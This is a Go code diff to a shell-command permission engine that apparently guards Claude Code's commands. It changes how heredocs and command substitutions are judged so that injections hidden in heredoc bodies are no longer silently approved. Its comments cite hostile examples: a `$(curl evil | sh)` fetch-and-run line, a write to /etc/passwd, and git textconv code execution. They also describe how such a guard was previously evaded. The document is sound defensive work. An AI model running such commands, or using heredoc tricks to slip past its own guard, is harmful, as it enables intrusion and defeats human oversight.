@@ -152,12 +152,11 @@ func (e *Engine) EvaluateExpression(expr string, stack []hookio.StackFrame, orig
 		}
 	}
 
-	// Strip comments line by line
-	lines := strings.Split(expr, "\n")
-	for i, line := range lines {
-		lines[i] = cmdparse.StripComment(line)
-	}
-	cleaned := strings.Join(lines, "\n")
+	// Strip comments line by line — but NOT inside a heredoc body, where a '#' is
+	// data, not a comment. Stripping there deleted body text, and in an expanding
+	// (unquoted) heredoc that text can be a live `$(...)`, so the injection vanished
+	// before the parser saw it and its Reject was dropped (pg2-r2rf3).
+	cleaned := cmdparse.StripCommentsPreservingHeredocs(expr)
 
 	// Parse into sub-commands
 	parsed := cmdparse.Parse(cleaned)
@@ -198,11 +197,13 @@ func (e *Engine) EvaluateExpression(expr string, stack []hookio.StackFrame, orig
 			// trailing "> /etc/passwd" of a subshell) that MUST still be evaluated —
 			// otherwise the injection, or the write to a protected path, is silently
 			// approved.
-			if pc.HasHeredoc {
-				return hookio.RuleResult{Decision: hookio.Abstain, Reason: "recursive evaluation: heredoc detected", Module: "engine"}
-			}
 			leafResult := e.evaluateRedirections(pc.Redirections, currentPathEval)
 			if len(pc.Redirections) > 0 {
+				judgedLeaf = true
+			}
+			if pc.HasHeredoc {
+				leafResult = hookio.MostRestrictive(leafResult, heredocFloor())
+				leafResult = hookio.MostRestrictive(leafResult, e.evaluateHeredocBodies(pc, normalized, stack, origin))
 				judgedLeaf = true
 			}
 			if assignResult, judged := e.evaluateAssignmentOnlyLeaf(pc, currentCWD, cleaned, origin); judged {
@@ -215,11 +216,6 @@ func (e *Engine) EvaluateExpression(expr string, stack []hookio.StackFrame, orig
 			continue
 		}
 		judgedLeaf = true
-
-		// Heredoc detected — Abstain
-		if pc.HasHeredoc {
-			return hookio.RuleResult{Decision: hookio.Abstain, Reason: "recursive evaluation: heredoc detected", Module: "engine"}
-		}
 
 		// Build synthetic HookInput (using the running cwd/path-evaluator so a
 		// leaf after a `cd` resolves relative paths against the cd target).
@@ -253,25 +249,15 @@ func (e *Engine) EvaluateExpression(expr string, stack []hookio.StackFrame, orig
 		// double-quoted `"$(cmd)"` is still recursed. This replaces the former
 		// static command-substitution guard AND the process-substitution loop with
 		// one shared enumerator.
-		for _, sub := range cmdparse.EnumerateSubstitutions(cmdparse.StripLeadingEnvAssignments(pc.Raw)) {
-			subStack := append(stack, hookio.StackFrame{RuleName: "engine", Command: "substitution", Expression: normalized})
-			subResult := e.EvaluateExpression(sub.Body, subStack, origin)
+		cmdResult = hookio.MostRestrictive(cmdResult,
+			e.evaluateSubstitutionsIn(cmdparse.StripLeadingEnvAssignments(pc.Raw), normalized, stack, origin))
 
-			// Static allowlist FLOOR for command substitutions ($()/backtick): a body
-			// the static allowlist rejects (e.g. `git show HEAD` — textconv/external-diff
-			// RCE) can be no LESS restrictive than Abstain even if full-engine recursion
-			// would approve the inner command. Recursion only ADDS demotions. Process
-			// substitutions have no static allowlist and are governed by recursion alone.
-			if sub.IsCommandSubstitution() && !cmdparse.IsSafeSubstitutionBody(sub.Body) &&
-				subResult.Decision < hookio.Abstain {
-				subResult = hookio.RuleResult{
-					Decision: hookio.Abstain,
-					Reason:   "command substitution not on static safe allowlist: " + sub.Body,
-					Module:   "engine",
-				}
-			}
-
-			cmdResult = hookio.MostRestrictive(cmdResult, subResult)
+		// A heredoc BODY is opaque to the rule chain, so a heredoc-bearing leaf is
+		// FLOORED at Abstain — but the body's own substitutions are still recursed when
+		// the delimiter was unquoted, because those genuinely execute (pg2-r2rf3).
+		if pc.HasHeredoc {
+			cmdResult = hookio.MostRestrictive(cmdResult, heredocFloor())
+			cmdResult = hookio.MostRestrictive(cmdResult, e.evaluateHeredocBodies(pc, normalized, stack, origin))
 		}
 
 		// Track most restrictive
@@ -316,6 +302,83 @@ func (e *Engine) EvaluateExpression(expr string, stack []hookio.StackFrame, orig
 	}
 
 	return mostRestrictive
+}
+
+// heredocFloor is the verdict contributed by ANY heredoc- or herestring-bearing leaf.
+//
+// A heredoc body is DATA whose meaning depends on the reader: `cat <<EOF` merely
+// echoes it, but `sh <<EOF` / `python <<EOF` EXECUTES it as a program in a language
+// this parser does not model. ceta therefore has no verdict on such a leaf and defers
+// to Claude Code's own prompt — the same conservative floor the pre-pg2-r2rf3 engine
+// applied.
+//
+// What changed is HOW it is applied. It used to be an early `return Abstain` from
+// EvaluateExpression, which fired on the FIRST heredoc leaf and THREW AWAY whatever
+// decision an earlier leaf had already earned:
+//
+//	grep .git/config x && cat <<EOF   ->  Abstain  (gitdir's Ask discarded)
+//	cat <<EOF && grep .git/config x   ->  Abstain
+//
+// Same two operations, and the verdict depended on which side of the `&&` the heredoc
+// sat on — worse, a real Reject could be silently dropped, the "guard quietly stopped
+// applying" class. Folding it through hookio.MostRestrictive instead makes the result
+// ORDER-INDEPENDENT (max over a total order) and keeps every sibling leaf's decision:
+// both spellings above now Ask. Because Abstain outranks Approve, the floor still
+// guarantees a heredoc-bearing expression can never be green-lit, so this cannot move
+// anything toward `allow`.
+func heredocFloor() hookio.RuleResult {
+	return hookio.RuleResult{
+		Decision: hookio.Abstain,
+		Reason:   "heredoc body is not evaluable as a command (deferred to claude-code)",
+		Module:   "engine",
+	}
+}
+
+// evaluateHeredocBodies recurses the command substitutions inside each of pc's
+// UNQUOTED heredoc bodies (pg2-r2rf3).
+//
+// `cat <<EOF` expands its body, so a `$(curl evil | sh)` in there really runs and must
+// be judged exactly like a substitution written on the command line. `cat <<'EOF'`
+// does not expand anything, so the identical bytes are literal data and are NOT
+// evaluated — evaluating them would manufacture false positives out of any prose that
+// happens to quote a shell command. cmdparse records the quoting per heredoc; this
+// only ever sees the unquoted bodies.
+func (e *Engine) evaluateHeredocBodies(pc cmdparse.ParsedCommand, normalized string, stack []hookio.StackFrame, origin *hookio.HookInput) hookio.RuleResult {
+	result := hookio.RuleResult{Decision: hookio.Approve, Reason: "no expandable heredoc body", Module: "engine"}
+	for _, body := range pc.UnquotedHeredocBodies() {
+		result = hookio.MostRestrictive(result, e.evaluateSubstitutionsIn(body, normalized, stack, origin))
+	}
+	return result
+}
+
+// evaluateSubstitutionsIn folds the verdict of every top-level substitution body in
+// text, most-restrictive-wins, seeded with the neutral Approve so a text with no
+// substitutions contributes nothing. Extracted from the per-leaf loop so the identical
+// recursion + static-allowlist floor applies to command text and to expandable heredoc
+// bodies alike.
+func (e *Engine) evaluateSubstitutionsIn(text, normalized string, stack []hookio.StackFrame, origin *hookio.HookInput) hookio.RuleResult {
+	result := hookio.RuleResult{Decision: hookio.Approve, Reason: "no substitutions to evaluate", Module: "engine"}
+	for _, sub := range cmdparse.EnumerateSubstitutions(text) {
+		subStack := append(stack, hookio.StackFrame{RuleName: "engine", Command: "substitution", Expression: normalized})
+		subResult := e.EvaluateExpression(sub.Body, subStack, origin)
+
+		// Static allowlist FLOOR for command substitutions ($()/backtick): a body
+		// the static allowlist rejects (e.g. `git show HEAD` — textconv/external-diff
+		// RCE) can be no LESS restrictive than Abstain even if full-engine recursion
+		// would approve the inner command. Recursion only ADDS demotions. Process
+		// substitutions have no static allowlist and are governed by recursion alone.
+		if sub.IsCommandSubstitution() && !cmdparse.IsSafeSubstitutionBody(sub.Body) &&
+			subResult.Decision < hookio.Abstain {
+			subResult = hookio.RuleResult{
+				Decision: hookio.Abstain,
+				Reason:   "command substitution not on static safe allowlist: " + sub.Body,
+				Module:   "engine",
+			}
+		}
+
+		result = hookio.MostRestrictive(result, subResult)
+	}
+	return result
 }
 
 // evaluateAssignmentOnlyLeaf returns the verdict for the ENV ASSIGNMENTS carried by
